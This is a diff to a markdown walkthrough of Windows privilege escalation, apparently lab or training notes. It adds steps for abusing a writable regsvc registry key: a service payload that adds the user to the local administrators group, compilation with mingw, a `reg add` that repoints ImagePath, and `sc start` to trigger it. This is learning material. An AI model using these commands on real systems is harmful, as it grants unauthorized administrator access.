@@ -30,7 +30,7 @@ PS C:\>. .\PowerUp.ps1
 PS C:\>Invoke-AllChecks
 ```
 
-![PoweerUp Invoke-AllChecks](./pictures/registry-powerup.png)
+![PowerUp Invoke-AllChecks](./pictures/registry-powerup.png)
 
 ### Escalation via Autorun
 
@@ -78,4 +78,43 @@ to elevate privileges in an existing session
 
 ### Overview of regsvc ACL
 
+Fetch the ACL for the regsvc registry key
 
+`Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
+
+![regsvc](./pictures/registry-regsvc.png)
+
+The NT AUTHORITY\INTERACTIVE group is any user logged into the local machine, so we have full control over 
+the key
+
+### regsvc Escalation
+
+Download the windows_service.c file using a python ftp server on the attacking machine
+
+`python -m pyftpdlib -p 21 --write`
+
+Change the system() payload
+
+`cmd.exe /k net localgroup administrators user /add`
+
+Compile the malicious service with mingw32 gcc
+
+`x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
+
+Upload the malicious service exe to the target
+
+Add the service exe to the regsvc registry key, using /v to add a value to a subkey ImagePath which 
+contains the path of the driver's image file. When the service starts the exe will be executed by the service
+
+`C:\>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
+
+- `/t` type of value, REG_EXPAND_SZ is a string
+- `/d` data, in this instance the string value
+- `/f` no prompt
+
+Then we start the service to add our current user to the administrators local group
+
+`sc start regsvc`
+
+![Update regsvc subkey](./pictures/registry-regsvc-add-subkey.png)
+![Update regsvc subkey](./pictures/registry-regsvc-admins.png)
